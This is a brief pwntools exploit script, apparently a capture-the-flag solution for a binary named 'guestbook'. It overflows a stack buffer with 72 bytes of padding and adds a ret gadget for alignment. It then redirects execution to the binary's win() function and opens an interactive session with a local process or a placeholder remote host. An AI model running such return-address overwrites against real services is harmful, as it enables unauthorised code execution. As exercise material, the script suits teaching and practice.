#!/usr/bin/env python3
from pwn import *

exe = ELF("./guestbook")
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_RIP = 72

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x000000000040101a   # ret — stack alignment

def conn():
    if args.LOCAL:
        return process(exe.path)
    return remote(HOSTNAME, PORT)

def main():
    r = conn()

    # ── exploit phase ─────────────────────────────────────────────────────────
    payload = flat(
        b'A' * OFFSET_TO_RIP,   # fill buffer + saved RBP
        p64(GADGET),             # ret — align stack to 16 bytes
        p64(exe.sym.win),        # redirect execution to win()
    )

    r.recvuntil(b"name?\n")
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()